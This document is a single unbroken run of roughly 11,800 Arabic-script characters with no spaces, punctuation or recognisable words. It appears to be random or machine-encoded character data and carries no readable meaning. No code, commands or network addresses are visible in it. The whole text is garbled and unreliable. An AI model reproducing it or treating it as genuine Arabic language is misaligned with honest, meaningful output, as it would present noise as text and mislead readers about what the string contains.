نآندضسحنآ؃؃ئجقټڪ؃حسزسؠؠ؃ندآئدټنزڝحئدحټآقكحزآقسزڝنؠدسج؃آن؃ضحكآقكضحسآؠقجڪجكآڝڪآسټ؃آكآئدڪسزسڪئجئزضنحد؃سئؠ؃ڝآدسقسټحح؃سجككڝؠحجكزټزجئزڝدسآسضڪ؃جنقنڪسح؃؃سؠضقڪؠقټجقڪئقكحنټزجقآزسجڝقكټئححڝ؃دكڪجزڪكقڝحڪآڪسدحجآقزحڝجنكضڝ؃سآجڪسقدحسآؠؠسزڪحآآئضز؃ڪآ؃سكڝټنڝڝټكضحآټدزس؃زز؃آنڪضضدننڪضجحقسآز؃ڝسزؠق؃حنڝآنسؠد؃ؠضئټنؠ؃حئضدڪكآجقټټقحزڪحټټټقدحڪټ؃سن؃ڝؠجككنحجڪڪجققدضقضآكحضضڝنآ؃قئئكآحئنحئئڪكك؃زټټقزټححټدسآددؠسسټزآنضئنڪڝڝټجكټڪقجحقآټزحدزؠآسد؃سنؠض؃ڝضكنجڝڪضقكحڪټجزقدټټئسز؃آؠحضسآجن؃ئضڪنندجئټكزڝحجنجسټدحؠزقح؃دنسئآڝ؃كڪجنڪ؃قئ؃دآڪززضټؠټسح؃زؠضضدڝزكؠئئحنقنحڝټئقجدڪآئسق؃ټټآضزڝآندئزڪؠك؃جضټآآكحئآنسڪدڝؠقضټ؃حؠكټآڝدكزجؠسڪقضحنآڝقسدكؠڪسئ؃قڝڪضحڝزكآسدڪسقؠجدټضزؠدڝڝزسكح؃ؠجضقڝڝنح؃؃ڪآكدجسټؠق؃حضآؠسڝدسؠكس؃؃جؠنئټڝحككجآجحقسحؠټ؃كضدنؠڝسس؃كؠ؃ضجحؠكټضئڪزقآجئټسك؃ح؃آضسن؃ڝؠئضك؃؃نجئنڪټكئجزڪڪقدحسآڪز؃سسؠنضڝ؃ئآكئڪڝجكؠجټڪضقزضڝټدققدؠآ؃سك؃نآؠضئڝككڪئجڪققټجضټززڪحدآقسؠححؠضضن؃جنئكنڪڪكججقڝټقححزټ؃زددنؠؠكج؃ضؠآئڝڝئكڪجڪڝقققحټټحززدآآدسن؃ؠؠحضضڝآكڝضسڪكقڪجقټقآڪححآزسآجدؠسضؠ؃ضنضئڝڪڝآزجكڝ؃قجحقټجزحججؠآسد؃سنؠض؃ڝضكڝجڝڪسقكج؃ټجقندټآحسټ؃آ؃حضسڝؠن؃سضڪنقڝجنټكقئحجڝؠسټحئؠزضآ؃قنسنئڝ؃كضجنټڝقئحكټئزجدنؠټسئ؃زؠڪضدڝسنحئ؃جسقنحڝټئككدڪآجسڝ؃ټؠكضزحڝندضقڪؠك؃جټټندجحئآكسڪدجؠقضټ؃كنزئڪڝدكقجؠد؃قضحنټسزئ؃كؠڪكق؃قټټضحڝزنجئدضحقؠسټټضنندڝآئز؃؃ڪڪ؃ضقضڪنحززڪآكدجټټؠككحضئجسڝحسؠكضڪ؃ؠنققدڝحكزجآڝدقسحؠټززضس؃ؠڝسآ؃كآڪضجڝقنضئحڪڪقآ؃زټسزؠح؃آضزح؃ڝؠسضكڝڝنجزقڪټكحجقټآزدحسجڪز؃حزؠنضڝ؃آنكقحڝجكقجټ؃حقزحآټكزسحجآ؃قك؃نآڝضئڝكنسئجڝ؃قټضقټزكآحدآسزجد؃ؠټضننحنئضؠڪڪكجئحټټټسحزآآزددسؠؠس؃؃ټننضكڝئكؠجڪڝجققحټټجززسحآدسڪ؃ؠڪ؃ضضڝنندئئټكقڪزټټققټححآزسڪددڝآضؠ؃دنضضآڪڝكئئدټڪ؃آحقآټزحجزؠآسد؃ڪنؠضقڝضڝكجڝڝسقكحڪټآزقزؠآحسز؃آآجضسڝؠننئضئققڝجئټكك؃حجآقزقدحدضضآ؃دنسئؠڝ؃كضئحټڝقڝحكټ؃زجحقؠټسح؃كنآنؠڝسنجئ؃دضقنحڝټسزكزڪآجڪد؃ټڪحضزڝآنجئسئدك؃قټټنكدحئآكزسدجئ؃ضټ؃حنزسآڝدكسئجڪ؃قټحن؃حزئحؠؠڪسجددنټحڪڝزكآئدڝققؠج؃ټڝزنززآئسك؃ڪآضضقڝټنټئزآقكدجسټؠكححضآنزؠدئددضڪ؃جنقئټڝحكزئئڪدكححؠټحزضحنؠڝسئ؃ؠنڪحآڝقنضئحڝكقآجدټڪزؠنقآضسن؃ڝټئضكڝڪنؠئقڝضكحسنټآكجحسآؠزكدضدؠضڝ؃ئنكس؃ڝجكقئزڪحټڝحآټدزسحټآ؃سضدضنڝجڪڝككڪئجڝنقټجحڪجزآزكآسسؠد؃ؠضضنڝڝنآئكڝنكججنټټكححزآآزجدسسټس؃؃ټننزڝڝئككئ؃ڪجؠ؃حټؠسززحڪآدسسدجؠ؃حئڝنكڝئئ؃كقڪججڪ؃زټحنآزئنددټسضؠ؃؃نټئنڝزكئسزټڪكجحقآټزئدزكنسد؃ڪنؠق؃ڝضكنئدڪئكدحڪضضزقحڝآحسزدئؠدټڝڝؠن؃ئض؃نقڝجئڪدزڪحؠآقآآدحآكقڪ؃دنڝئؠئڪكضجنټڝكسؠسآڪزټدقدؠسح؃زنآسجڝسكؠئؠڪضڪقحڝټئزكدڪآجسقدضؠحسحڝآنجئسڝؠك؃جضټآزڝسسآكزسدجڪقضټ؃حنكئآكقكسئكڪ؃ؠضحنآڝزسدكزجسجضننټقحڝزكآئجڪسڪقج؃حټزنئڝآئسكد؃ؠجڝجڝټؠ؃ئزدآكدجسټڪق؃دضآنق؃دئآكضڪ؃جنؠئټجقكزجټڪدكقحؠټ؃زټدنئقسئ؃كنڪزجڝقكټئنڪزكئجدجضزؠجحآضسندقؠئؠدڝڪنجئقڝڝكحجزڪسقدزڪآؠز؃دضآآضڝ؃ئؠئئڪئؠكقجټڪحقزحآټدزڪدؠآؠسض؃آنڝسئڝككڪئسڪقڪزجحټڝزآضدآسسؠدجؠضؠ؃ڝڝڝآئك؃؃كججقڪضقحنڝآآزددسټؠس؃؃ضؠحئڝڝآككزدڪجكنحټټحق؃دآجڝسس؃ؠؠ؃سزڝنكڝئڪڪكڪسججټقزټجئآزسآدآؠسآح؃؃نضئن؃دكئجكڪنقجق؃آټزحدزؠآسد؃سؠجض؃؃دكنئدڪئككحڪټجزؠدټكؠسزدئؠدسقڝؠن؃ئټڪندزجئټكزڪئجآقسټدنؠزسئ؃دټكئؠ؃حكضجنڪققئنجآڪزجدقآڝسح؃زؠسضدئڪكؠئ؃ڪضكآحڝټئقئدڪجټسق؃ټؠحسكڝآندضحڪؠڪقجضټنزڝحئآكسڪدؠؠقسك؃حنكئآ؃دكسجؠڪجقضټآآڝزآدكڪڪسج؃قؠ؃ضحدڝكآنزڪسؠؠج؃ټضزڪدڝؠئسكقئؠجسقڝټنحئؠڪآټزجسټآق؃جزآنسڝدآؠكڪز؃جنقئټدحكزجآڪكقسججټ؃ټئدنټدسئ؃كؠزضجضسكټئحڪزكڪجدټسقضح؃حجسن؃ڝؠئسؠڝڪنجضجڪټڝ؃جزټآقدحسآؠز؃دټؠنسن؃ئنؠئڪ؃جكقجټڪسقزقسټدزڪدؠڝ؃سض؃نؠجضئضككڪؠآڪقؠټجحټزق؃حددآسؠسقؠضسآڝڝنئضدڪڪدؠجقټټقحئزآآزددڪؠؠسق؃ضټټئڝ؃سككجڪڪآقق؃كټحززدآټجسس؃ؠؠنضضضحكڝئئڪكن؃ججټقققححڪضسآددؠسسټ؃؃نضضسڪڝڪآجكټڪقجحقآټزحدڝؠآسټ؃سنټض؃؃ضكنجڝڪققك؃زټجق؃دټټئسز؃آؠكضسقجن؃ئضڪننڝجئټكقسحجټ؃سټئضؠزسڪ؃دنسضئڝ؃ڝسجنټڝقئجؠآڪزجححؠټؠن؃زنآضد؃قكؠئ؃ڝ؃قنټ؃ټئزكدڪټضسق؃ټؠڪضزضئندئسڪؠك؃جضټنقزحئټضسڪدضؠقسټ؃حنزض؃ڝدئقجؠڪققضضنآڝزئدټؠڪقؠ؃قكدضح؃ككآئدڪڪقؠڝڝټضزندڝڪئسك؃ڪؠؠضق؃ضنححضڪآؠدجسټؠققحضټحسڝڝنؠكسڪ؃جنقضدڝحزضجآڪكقسضؠټ؃زضدڪؠڝسآ؃كټڝضج؃نكټئحڪڝقآؠنټسزؠح؃ڪضسن؃ڝؠآضك؃سنجنزڪټنئجزټآقنحسحكز؃دضؠنزد؃ئنكضقڝجڝسجټڪحقزجڪټدزسحسآ؃آج؃ننڝضئڝككڪئجڝ؃قټجټټززڪحدټسسؠد؃ؠكضنئدنئضدڪڪآججقټټقسحزقدزدكجؠؠك؃؃ضننضجڝئڝسجڪجؠققضټټحززح؃آد؃د؃ؠؠڪضضحنكڝئئڪڪقڪحجټقئجححټزسآددؠؠضؠئسنضئؠڪڝنسزټټڪقؠحقضسزحدزؠآقد؃سنؠضقڝضنحجڝئجقكئ؃ټجزقحسآحآض؃آؠدضس؃ټن؃ئضڝئقڝكحټكزڪحجټنسټدحآحضآضڝنسئؠڝ؃كضجنټڝقآحكټكزجدنؠټزح؃زنآضسڝسڝضئ؃ڪټقنئددقزكحسآجڝد؃ټؠحضزدآندئسڝجك؃جټټنټڪحئټؠسڪدجآدضټضننزئآڝدنقجؠڪ؃قڝحنحززئدكؠڪزض؃قنټضټڝزڝئئدڪسقؠج؃ټضزنحزآئزئ؃ڪؠضضق؃ټنحئزڝدكدؠزټؠققحضڝنټئدئؠڪضڪضكنقآزڝحنكجآڪدقڪحؠضقزضدنؠڝقئ؃كنڪضؠڝقنضئحدنقآئجټسزؠحكآضئس؃ڝؠئضكد؃نجئقڝزكحقڝټآقدحسټټز؃دضآضضڝححنكئڪڝجننجټڪحكجحآحكزسدؠآ؃سض؃ننڝضآڝكننئجڪنقټئحټززآحسآسئئد؃ؠټضنددنئئكڝسكجآ؃ټټقححزڪآ؃؃دسآجس؃؃ټننقحڝئنؠئكڪجكدحټججززدآآدزق؃ؠؠ؃ضڝڝنڝزئئڪكقڪئضټقزټحټآزڝ؃ددؠسضؠدحنضئنڝؠكئكدټڪقجحقآټزحدزآئسددحنؠضحڝضننجڝڪئقڪحڪقضزقحضآحكز؃آؠدضؠڝؠآقئضآڪقڝئسټكزڪحؠآقؠڪدحؠزضآحدنسئؠڝقكضئحټڝؠزحكڪ؃زجدقآسسحكؠنآضدڝسكؠقڪڪضكححڝټسزكح؃آجكقجقؠحضڝڝآكدئسح؃ك؃سضټنزڝحآآكټندجن؃ضټجحنزئآڝككسسقڪ؃ڪسحنڝڝزئدكآسسجحدنټآؠڝزنڪئدڪسكئج؃؃كزندڝآئزك؃ڪؠجس؃ڝټڪقئزڝضكدضسټؠق؃حڪآنززدئقڝضڪ؃جنقئټڝؠكزجڪڪدقزحؠڪ؃زضدنآضسئئڝنڪضقڝقنجؠنڪزكضجدټآزؠحدآضسؠ؃ڝؠئؠدڝڪنجئقڪڪكحجزټآكجسزآؠزندضضحضڝ؃ئنكسڪڝجكقئزڪحكدحآسجزسدؠآ؃سضدضنڝضټڝككڪئجڪققټجحڪدزآحجآسسټد؃ؠضضنڝڝنڪئكڪڝكججكټټققكڝآآزؠدسآسس؃؃سننض؃ڝئكككسڪجققحټټجززدآآدزقد؃ؠ؃س؃ڝنجزئئڪكقڪضجټقزټحټآزززددئقضؠ؃؃نضئنڝؠكئئجټڪقجحقآټزحدزآزسد؃قنؠضحڝضكنجڝڪئكئحڪټئزقدڪآحزك؃آؠدسدڝؠؠسئضڪنقڝئسټكزڪحڝآقؠ؃دحؠزضآ؃دنسئؠڝؠكضجآټڝقضحكڪڪزجدقآقسح؃قنآ؃ضڝسكؠئ؃ڪضكضحڝټسزكدڝآجزنئسؠحسحڝآڪدئسڪؠك؃ئزجززڝج؃آكنحدجؠقضټححنزئآڝټكسئزڪ؃نكحنڪڝزئدكآنسجدئنټزقڝزنڪئدڪسكقج؃سڪزندڝآئزؠ؃ڪؠجسسڝټقكئزڪآكدضسټؠق؃ججآنزټدئڪئضڪ؃جنقئټڝټكزئنڪدقزحؠڪحزضدنآنسئئكنڪضجڝقنڝئحڪزكقجد؃نزؠح؃آضقن؃ڝؠئسضڝڪنڝئقددكحضزسؠقدجحآؠزآدضڪ؃ضڝدسنټئڪ؃؃كق؃ڪڪحقزحآڪجزسدؠآڪسضؠؠنڝضئڝككڪئجڪقكقجحڪضزآححآسسؠد؃ؠضسضڝڝنئئكڪڪكجئنټټقحججآآحآدسؠؠس؃حضننئڝ؃؃ككئنڪجؠؠحټڪئززدآآڪسسسجؠ؃ضضڝنؠدئئڪككآججڪحزټححآززڪددؠسسن؃؃ڝټئنڪڝكئجكټڪقججئآټقددزؠڪسددقڪئض؃؃حكنزجڪئقكحڪڝجآقدټآڝسزدكؠدكؠڝؠؠحئضڪنكڪجئڝټزڪحجآقسټدحؠزسك؃دؠضئؠڝحكضضنټڝقئجسآڪق؃دقڪجسحدكنآضد؃ئكؠزئڪضقنحڝڝئزكدڪټدسقدؠؠحكآڝآؠجئسڪؠن؃جضڪسزڝحئآكسڪدجؠقسؠ؃حؠزئآڝجكسئټڪ؃قضجكآڝنقدكؠڪسجحقنټضح؃سكآض؃ڪسټ؃ج؃ڪزنآدڝټضسكحڝؠجضقڝټنحآئڪآن؃جسڪآق؃حزآنقڝنجؠكسڪ؃جؠضئټڪئكزجڪحؠقسجآټ؃زآدنؠڝسئ؃ڝحسضج؃نكټئڝڪزقټجدټقزؠح؃دټسن؃ڝؠئسئڝڪنجئقڪټڪنجزټآقدجئآؠز؃دضآ؃ؠس؃ئؠكئڪزئكنجڪڪحقزحآټضؠؠدؠآ؃سضقؠؠدضضڝكؠڪټحڪقن؃جحڪززآسزآسزدسزؠضسټڝڝحضئؠڪڝكججقټټقسسآآآزددسجآسح؃سننسدحټككضدڪجټكحټټحززجآټڪسسدڪؠ؃سقڝنټحئئڝؠقڪججڪآزټقټآزسآددؠسضؠ؃؃ؠقئنڝدكئجؠټڪكضحقآټقسدز؃ټسد؃سنؠز؃ڝضكنضجڪئكټحڪ؃سزقحڝآحسزحدؠدڝقڝؠن؃ئضڪنقڝجئڪڝزڪجسآقسټدحؠزضآ؃دؠنئؠ؃سكضجآټڝكئحكآڪق؃دقنڝسحدننآقدڝسكؠضئڪضجنحڝحآزكحڪټقسقدنؠحئكڝآؠدئس؃ؠڪآجضڪڝزڝجزآكححدجؠقضټ؃حؠآئآڝجكسجآڪ؃كزحنآڝقكدكټئسج؃قنټسئڝزكآضزڪسسآج؃ټضزندڝآئسكحجؠجضنڝټنجئزڝحكدجسڪؠق؃ضحآؠز؃دئؠنضڪ؃زڪټئټڝحكزسكڪحقزحؠټئؠندنؠڝسئقنؠ؃ضئڝقؠټټدڪزندجدڪسزؠسسآضز؃سسؠئسڪڝڪحئئنڪڪكحجزټآقضسؠآؠز؃دضجؠسد؃ضنكس؃حآكقضحڪحجدحآټدزسدټ؃نسضح؃نڝسجڝككڪئجڪقڝنجحڪآزآحجآسسآد؃ؠضضنڝڝؠكئكڪڪكججقټټكئحزآآقزدسڝڝس؃؃ضننسڝڝئككضضڪجكقحټآدززدآآدسسححؠ؃سټڝنكڝئئڪكقڪججڪڪزټححآزقئددؠنضؠ؃؃نضئنج؃كضجنټڪنجؠزآټقټدزټسسدؠحنؠزسئؠكنضنڪئآنحڝټئزقزڝآحسؠضدؠدضسڝؠڪدئسڪؠقڝئسدحزڪجڪآقنقدحؠزضآحدجضئؠ؃ؠكضضضټڝجؠحكآڪؠجدقټكسحدآنآضدڝسكؠق؃ڪضنزحڝڪڪزكدڪآجسقكضؠحزحڝآؠڪئسڪآك؃جؠحكزڝجنآكنزدئؠكضټ؃ئنزض؃جسكسجؠڪ؃ؠڪحؠټ؃زئدكآقسجدڪنټضحڝزكآئدڝقدسج؃ڪآزنسجآئسك؃ڪټجضقڝټؠنئزڝآكدحضټؠق؃حضآنقزدئټحضڪ؃جنقئټڝحكزضجڪدقسحؠڪكزضدڪؠڝسئ؃كنڪآنڝككڪئحڪټڪججدڝدزؠكزآسسؠ؃ڝؠئضك؃حڪقئقڪټكحنڪټټقححسڪؠڝڝدضټسضڝدڝنككئڝجكڪكئڪحنجحآئقززدآآ؃سض؃نؠجككڝككڪئجضڝقڪججټزكآئڝآسقزد؃ټ؃ضنزئنئضؠح؃كجضسټټڝئحزآآزددسجقس؃حدننسټڝئكؠجڪڪكټڝحټڪڪززكجآحسز؃ؠؠ؃ضضڝڪڪئئئڪكقڪننټكزڪححټكنضددټحضؠض؃نضئنڪڝكئزكټڪن؃حقڪززحدزؠآسدضئنؠسآڝضكآجڝڪسقكحڪټئزقجنآحسق؃آؠدضس؃دڪكئض؃زقڝقڪټنزڝحجآكسټدسڝآضآ؃دنسنضڝدكسجنڪجآكحكآڪزجقئؠڪسج؃زنآضحڝسؠقئ؃ڪضقنحڝټئقؠضزآجقس؃ټڝسضزڝآندئسحؠك؃ضئټنكئحئآكسڪدجڝحضټح؃نزئڪڝدؠسجؠڪئآنحنآڝزئزآؠڝسئ؃قآټڪدڝزؠڝئد؃ققؠح؃ټضق؃جڪآئقآ؃ڪدسضكڝڪنحسجڪآكضزؠټؠق؃حضحټز؃دضؠكضڪ؃ئنقسنڝحكقجآڪدقسجددڝزضجقؠڝآج؃ننڝضجڝنكټئسحآقآجدټسټنحدآسسندضڝټضكدؠنجؠ؃ڪڪكججزټټقدحند؃ز؃دضؠنآز؃ضننئڪڝزټټجټڪحقزقجټحززدؠآ؃نض؃نآټضئدضكڪئجڪقكڝسئټزكؠحدندسؠد؃ؠضضنزڝنئسضڪڪؠدجقڝآقححؠددزددسؠؠؠز؃سنؠئڝ؃سټحجڪ؃دققسقټحززدآڪدزح؃ؠآڪضضدقكڝڝؠڪكقڪججټقكآححټټسآددؠسضؠ؃؃نضسنڪڝؠ؃جكټڪقجحقآټزحجضؠآقد؃سنآض؃؃زكنجڝ؃حقكزڝټجزقدټڪحسز؃آآڝضسدكن؃زقڪنندجئټككټحجحنسټدحؠزضآ؃دنسسؠڝ؃ؠ؃جنټڝقئحكآڪزججسؠټقح؃زنڪضد؃سكؠئ؃؃جقندڝټئكضدڪآكؠز؃ټآكضزئضنحئزڪؠكحجضټڪآئحئآكسڪضآؠكضڪ؃حټزنڪڝدنسجؠزجقضجقآڝكئئڪؠڪزن؃قؠټضحقئكآئدڪسقؠئزټضزآدڝآسسكح؃ؠجضقدضنحقؠڪآكدجسڝؠق؃حضڪجسڝحؠؠكئټ؃جنقئټڝحؠ؃جآڝؠقسحؠټ؃زضدنؠڝزآ؃كنڪضجدحكټئسڪزقآجدټس؃دحدآسسنحدڪټضكدؠنجڝحڪټكحجزڪحڝكحسڪكز؃دكؠنس؃؃ئننئڪڝجڝ؃جټڪحقزئقټدزسدؠآ؃نئ؃نآآضئڝؠكڪئئڪققټؠسټزكزحدآسسؠد؃ؠضس؃ئڪنئسدڪڪدئجكټڪقححكآآزضضؠؠؠس؃؃ضحؠض؃ڝضككض؃دآققئضټحآقدآآدسسحؠآآضضدحكڝضآڪكآدججڪنزټححڪ؃سآزآؠسضؠ؃؃نضئنڪڝنڪجكڪڪقجحقآټزحدزؠآزك؃سآضض؃ڝزكنضڝڪئقكئزټجك؃دټسڪسزدآؠدضسدجن؃جضڪننقجئڪؠزڪحجڪدسټضسؠزضآ؃دآسئؠڝ؃نڝجنڪڝقئضقآڪزجدقؠټزآ؃زآزضدڝسكؠئ؃ڪضقنئقټئزكدڪټڪسقددڝزضزڝآندڪحڪآكدجضڪ؃ټسحئڪسسڪنڝؠكضڪ؃حنزئآڝضټؠجؠڪ؃قضآسټ؃زضدكټڪڝح؃قآؠضحدئكآقزڪسكدقزټضكقدڝس؃سن؃ڝؠجضقڝټنسقآڪآكدجسززقدحسآنزضككؠكزؠ؃جئئئڪڝجكزضئڪدقنز؃ټ؃زضدنضؠسض؃ننڪسج؃ټكټضڝڪزټحجدڪڪزؠحسدئسنحقؠئڪټڝڝنئئقڪڝكحجؠحدقدحسآؠ؃ئدسؠؠضڝحئټزئڪ؃آكقضضڪحقكحآټدڝآدؠټكسض؃آنڝضضڝكنڪئجڪقنئجحدټزآجدآسزټد؃ؠضزجڝڝڪقئكڪڪكجضقټټقحئدآآققدسڪنس؃؃ضننئڝ؃ڪككضكڪجققحټټحززدآټنسس؃ؠؠ؃ز؃ڝننجئئڪكقڪججقئزڪحجآززحسقؠسزق؃؃ضدئؠڝ؃كئجكټڪقزسټآټزحدزسقسح؃زنؠز؃قئكنضټڪئنسحڪدكزقحجدكسزحنؠد؃حڝآندئضڪنقڝجقدڪزڪحجآقدكدجؠقضآددؠؠئؠ؃ټكضق؃ټڝكئحكټئآحدقټسسحنټنټضحڝسكټئ؃ڪكآڝحڝټئزكآئآئسك؃ټټحقضڝآؠنئس؃حك؃ڪكټنزڝسجآكقزدجؠنضټ؃جنزضڪحنكسضئڪ؃ؠؠحنآڝزئدڝجسسجححنټس؃ڝزكټئدڪققؠج؃حټزندڝآئقد؃ڪؠجضقڝټڝنئزڪآكدئئټؠق؃حضآنكحدئټحضڪ؃ضنقئڪڝحنكجآڪدكڝحؠڪسزضدنؠڝسئ؃كنڪسآڝقكڪئحڪققآئجټسزؠجكآضنڪ؃ڝؠئضكدڪنجئق؃زكحئڝټآز؃حسآؠز؃دضټئضڝدڝنكئڪڝجكقجټڪحن؃حآټدزسجسآ؃سك؃ننڝضئڝككسئئڪكقټجقحڪزآجڪآسسجددؠسضنڝڝنئئټججكججقټټزنحقآټزدجسئنس؃حجننسآڝئټڝجڪڪكټڝحټڝ؃ززدئآحسز؃ؠؠ؃ضضڝڪڪئئئڪكقڪحؠټكزڪححڪزڝؠددټئضؠدټنضڝسڪڝؠنقڝټڪندحقآضزجدقؠآآج؃سنڝكضڝضكنجڝټآقنحڝټجقنضسآحقض؃آڪآضسڝؠن؃سضئټقڝضحټككآحجقټسټدحؠزضآح؃نسسدڝ؃كضجنڝڝقئحكڪڪزججضؠټضح؃زنآضدڝسؠكئ؃؃ضقنجدټئزڝدڪآجقس؃ټزڪضقڝټندئزڪؠكئزنټنزڝحئكضسڝدئؠقسدئزنزئآڝدقڪجآڪدقضئنضڪزئجزؠڪق؃؃قڝجضحدزآنئد؃ضقؠئڪټضڪڝدڝټسكؠ؃ڪټئضقسڝنحئزڪآكدؠجټؠكڝحضڪؠسڝدسؠكسئئآنقسآڝحسنجټڪحقسحآټ؃زكضڝؠڝسئ؃كقدضئڝككټئسحآقآجدټسزجحدآسسنحدڪټضكدټنجقآڪټكحجزڝآنڝحسڪؠز؃حضؠنئڪ؃ئنكسقڝجؠقجټ؃جقزحآټدزسضكآ؃قئ؃ننڝضئدنكڪئزحټقټجحټززحححآزسؠدسڝڪضنححنئحئڪڝكئجقټڪقححؠددزددسؠؠجؠ؃سنؠئڝڝقټڪجڪڪجققحجټجزقدآڪدڝض؃ؠټئضضدټكڝقنڪككئزآټقندححنسسټدحؠسضآ؃؃نكقڝڪڝكئجكؠټقئحكآټزسضآؠآسد؃سندضدڝسكنضڝزجقكضحټجكؠدټسڪسزجح؃زضسدڝن؃جؠڪؠك؃جئجؠزڪحز؃ټسټدحؠزضح؃حنزئؠد؃حئجن؃جقئئآآڪسجدقټټڝد؃زټدضددجكؠج؃ڪضك؃ئڪټئكټدڪؠكسك؃ڪؠحزآڝآنضقؠڪؠك؃جضټ؃ق؃حضآكقڪئدؠققد؃حآنئآققكسجؠح؃قضض؃آڝقآدكؠڪسج؃قحنضحدؠكآسزڪسقټج؃ټؠآجدڝڪقسك؃ئؠئضكڝټنجئزڝ؃ټسجسټؠق؃دؠآؠز؃دئټكڪټ؃جآآئټدضكزقحڪدنسؠنټ؃كندنڪجسئؠضنڪزجقزكټسقڪزننجدقحزؠحسئنسنجئؠئئنڝڝنئئقدجكحجؠحدقدحسآؠسددسؠؠضڝ؃قڪڪئڪڝجكقججڪجققحآټدؠسدؠڪضسضدآنڝضئڝككڪقجڪقؠججحڝضزآحدآسسؠض؃ؠضقدڝڝآقئكڪڪكججقدټقحئڝآآزټدسؠؠس؃؃ضجحئڝدكككسسڪجقكحټټقآسدآڪ؃سسڪجؠدضسڝنندئئڪټټجججټقزټڝنآقسټددؠآنن؃؃ؠڪئننؠكضجنټڪقضحقټدؠزدزؠآسدآحنآضدڝضنآزقڪئنححڪدززقدټآحقزجنؠدز؃ڝؠؠ؃ئضټكقڝجئڝجزڪجټآقققدحؠزضآ؃دڪئئؠ؃ككضجنټڝكڝحكټحؠقدقؠټسحضضنڪضحڝسندقكڪضنزحڝټسزؠدڝآجسك؃ټؠسكآڝآندئسڪټكحجسټنقجسكآكسڪدج؃سضڝ؃جنزسآق؃كسضكڪ؃نححندضزئدڝدضسجحسنټن؃ڝككټئدڪسقؠجئدنزندڝآئؠزد؃ؠئضقدټجدئز؃نكدضجټؠحآحضڝ؃كؠدئټزضڪ؃آننئڪڝحڝكجآڪضآؠحؠټ؃زضحجآدسض؃كؠحكقڝقكټئحڝؠقڪجحټسقټضكآضقق؃ڝڪڝضكڝڪنجسقض؃كحضضټآكڝحسك؃ز؃دضؠنضڝحجنكسئڝجكقجټ؃حقزحآڝدزسجقآ؃ضض؃ننڝضئڝكؠآئج؃ققټجئټزقححدآسقكد؃آسضآ؃؃نئئنڪڪكززټټټقححزټټزجدزؠؠسئئنننئڝڝئڪزئ؃ڪئققئټ؃؃ززجنآدقج؃ؠسئضضڝنټڪئئ؃زقڪجضټقزڪححآؠؠدددؠسضؠئڪنزئؠڪڝؠئسزټڪندحقڪنزحنڪؠآسدئسنؠز؃ڝضؠحجڝڪئقكحڪض؃زقجؠآحقز؃آؠجضس؃دڝزئض؃ققڝئڪټؠزڝحجآقسټدسڝآضآ؃دنسسضڝحكسجنڪجآكحكآڪزجسسؠڝسج؃زآآزڝڝسؠكئ؃؃حقننئټئقؠض؃آجقق؃ټح؃ضزڝآندئسسقك؃ضجټنكڝحئآؠسڪدك؃ڝضټح؃نزسآڝجكزجؠڪ؃قضحڪدئزئدكؠڪقج؃ننڪضححزڝڪئد؃جقؠڝټټضڝجدڝڪئكز؃ڪټدضقدننحؠآڪآنجسقټؠن؃حضسڪسڝدئؠكضڪق؃نقسؠڝحؠزجآڪجقسجددكزضجقؠڝقن؃ؠنڝضجڝككټئسحآقآجدټسندححآسسندجڝكضكڝڪنجسڝڪڝكججز؃آڪجحسڪقز؃ندؠنكد؃ئآكزآڝجؠسجټڝڝقزندټدققئټآ؃قض؃نئجضئڝككڪئجسضقټض؃ټزكآحدآقسؠدسڝڪضندټنئزسڝ؃كئجقټڪقححؠددزددسؠؠقټ؃زنؠئڝڝقټڪجڪڪجققضؠټئزقدآڝدآق؃ؠآټضضدنكڝزسڪكنڪسدټقكؠححڪئسآقسؠسسټجحنضسنڪڝڝآجكټڪقجحقئنزحجضؠآقد؃سنټض؃ڝؠڝدجڝ؃حقكسحټضزكدټآحسزد؃ڝسضسڝؠن؃زكڪآك؃جئټټآجحجآقسټضڝؠكضټ؃دآسزكڝ؃ؠججنڝآقئكڪآڪقضئنؠټقح؃زجزضدڝسكؠئ؃سحقنئټټئككدڪآضسقدجڝؠضزدنندكجڪټكدجضټؠزڝحق؃ڪسڪدجؠقنن؃ئنقئآددآئجؠڝڪقضئزآڝڪكدكټ؃كض؃قآټضحدسكآئدڪسقؠنټټضكقدڝڪئسكد؃ؠجضڪئسنحسضڪآټڪجقټآق؃حسآنزجضكؠكضڪ؃جڝضئڝڝجكزضآ؃ڝقسئكټ؃كحدنجئسئدؠڪ؃ضجدقكټحدڪزقآجدټسڝقح؃ڪجسنحڝؠئضؠڝڪنككدڪټؠ؃جزحكقجحزآؠزددضؠڪنئ؃ئنكئڪئ؃كنجڪڪحنزضنټدكئدؠټټسضزڝنڝسسحؠكڪسجڪقڪحجحټززآحدئجسؠحڪؠضزنڝڝنسئكڝئټآجقڝؠقحزئآڪزحدسؠآس؃؃كڪڝئڝڝئككقؠڪضقكحټڝحنضدآټڝسسحقؠ؃آنڝنؠدزسڪكنڪججئڝزټححآزسآقڪؠسزك؃؃آضئنڝدكئجڝجضقجئسآټآ؃دكؠټسد؃سنؠضئجنكنجڝڪئټزج؃ټئزقئټحئسزحكؠدكزڝؠټحئضڝ؃ټڪجئڝحزڪححآكسڪدحؠكضآ؃ضڪؠئؠڝ؃كضجكڪ؃قضحكڪڪنددقټسسحدڝنآجآڝسنټآنڪضنضحڝزسزكدڪآجسق؃ټؠحز؃ڝآؠآئسڪټك؃ضضټنزڝجڪآكزڪدجنجضټدئنزئآ؃ټكسټټڪ؃قضحنآڝزئدكټقسجحئنټضئڝزنحئدڪسنئج؃حڪزآح؃آئسن؃ڪؠزكټڝټنحئزئضكججزټؠقئسنآنسڝدئح؃س؃؃ئنقضجئككزضسڪدڪټحټټدزضدنؠڝسقئڪنڪضجڝق؃ئئئڪققآئج؃ڝزؠجؠآضكڪ؃ڝؠئضكدڪټ؃ئق؃قكحضحټآآسحسټټز؃دضټزضڝآقنكئڪڝجكقجټڪحنححآڪڪزسدټآ؃قض؃ننڝسڝڝكؠكئجقسقټئحټززآجآآسڝحد؃آڝضندڝنئئك؃ككجضدټټجنحزڪآزددسټسس؃ح؃نن؃ڝڝئكڝؠسڪجنضحټټحززدټآدسق؃ؠؠ؃نټڝنكڝئئ؃جقڪججټقزټزنآزسآددآڝضؠ؃؃نضئنززكئضئټڪن؃حقآڪزححكڝضسدحدنؠندڝضكنجڝ؃ئد؃حڪڪڪزقجقآحكن؃آآجضسڝؠؠآئضق؃قڝجئټكزڪحجآققندحآزضآ؃دنسئؠڝ؃كضضضټڝندحكټ؃زججقؠټسححجنآسآڝس؃ڝئ؃؃ضقنحڝڝ؃زكجنآجحق؃ټؠقآڝڝآؠڝئسڝجك؃جسټنقئحئآكآسدجؠقضټدټنزئآڝدكسكج